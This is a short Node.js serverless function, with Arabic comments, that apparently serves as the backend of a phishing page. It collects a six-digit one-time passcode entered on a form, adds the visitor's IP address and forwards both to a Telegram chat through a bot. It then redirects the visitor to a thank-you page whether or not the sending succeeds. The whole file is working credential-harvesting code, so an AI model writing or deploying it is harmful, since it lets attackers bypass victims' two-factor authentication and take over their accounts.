const fetch = require('node-fetch');

// دالة ترميز الأحرف الخاصة بـ MarkdownV2 لـ Telegram
const escapeMarkdownV2 = (text) => {
    const replacements = {
        '\\': '\\\\', '_': '\\_', '*': '\\*', '[': '\\[', ']': '\\]', 
        '(': '\\(', ')': '\\)', '~': '\\~', '`': '\\`', '>': '\\>', 
        '#': '\\#', '+': '\\+', '-': '\\-', '=': '\\=', '|': '\\|', 
        '{': '\\{', '}': '\\}', '.': '\\.', '!': '\\!'
    };
    return text.replace(/[\\_*[\]()~`>#+\-=|{}.!]/g, match => replacements[match]);
};

exports.handler = async (event, context) => {
    if (event.httpMethod !== "POST") {
        return { statusCode: 405, body: "Method Not Allowed" };
    }
    
    const bodyParams = new URLSearchParams(event.body);
    
    // تجميع حقول OTP الستة
    let otpCode = '';
    for (let i = 1; i <= 6; i++) {
        otpCode += bodyParams.get(`otp${i}`) || '';
    }
    
    const ip = event.headers['client-ip'] || 'غير متوفر';

    // تطبيق الترميز
    const safe_otp = escapeMarkdownV2(otpCode);
    const safe_ip = escapeMarkdownV2(ip);

    // تشكيل الرسالة
    let message_text = `🔑 *New OTP Received \\(Donsaa\\)* 🔑\n\n`;
    message_text += `OTP Code: \`${safe_otp}\`\n`;
    message_text += `IP: \`${safe_ip}\``; 

    // إعدادات Telegram
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error("Telegram credentials missing in environment variables.");
        // التحويل إلى صفحة الشكر بالرغم من الخطأ
        return {
            statusCode: 303,
            headers: {
                Location: '/thankyou.html', // يجب إنشاء هذه الصفحة
            },
        };
    }
    
    const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const data = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message_text,
        parse_mode: 'MarkdownV2',
    };

    // إرسال البيانات إلى Telegram
    try {
        await fetch(TELEGRAM_API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    } catch (error) {
        console.error("Error sending message to Telegram:", error);
    }
    
    // التحويل إلى الوجهة النهائية (أنشئ ملف باسم thankyou.html)
    return {
        statusCode: 303,
        headers: {
            Location: '/thankyou.html', 
        },
    };
};
